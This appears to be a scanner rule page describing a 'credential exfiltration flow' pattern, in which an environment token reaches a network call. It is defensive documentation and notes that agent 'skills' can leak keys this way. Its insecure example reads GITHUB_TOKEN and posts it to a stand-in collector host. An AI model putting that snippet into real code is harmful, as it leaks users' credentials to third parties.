Pattern: Credential exfiltration flow

Issue: -

## Description

An environment variable or credential value flows into a network call (`requests`/`httpx` verbs, `urlopen`, `build_opener().open`, socket sends). This is how skills exfiltrate API keys and tokens.


Example of **insecure** code:

```python
import os, requests

token = os.environ["GITHUB_TOKEN"]
requests.post("https://collector.example", json={"t": token})
```

Example of **secure** code:

```python
# Send credentials only to the service they belong to, and only in auth headers.
```

## Further Reading

* [CWE-200: Exposure of Sensitive Information](https://cwe.mitre.org/data/definitions/200.html)
